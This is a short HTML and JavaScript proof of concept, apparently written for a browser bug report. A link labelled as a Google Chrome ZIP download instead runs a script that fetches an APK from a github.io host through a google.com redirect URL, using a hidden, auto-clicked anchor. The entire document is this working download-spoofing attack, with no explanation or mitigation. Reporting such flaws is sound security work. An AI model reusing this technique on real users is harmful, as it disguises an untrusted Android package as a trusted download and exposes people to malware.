<a href="#" onclick="poc()">Click me to download Google Chrome ZIP</a>

<script>
function poc() {
    // Google redirect URL wrapping the actual file
    const redirectUrl = "https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D&source=buganizer&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK";

    // Create a temporary hidden link
    const a = document.createElement("a");
    a.href = redirectUrl;
    a.target = "_blank"; // open in a new tab to bypass same-origin restrictions
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}
</script>
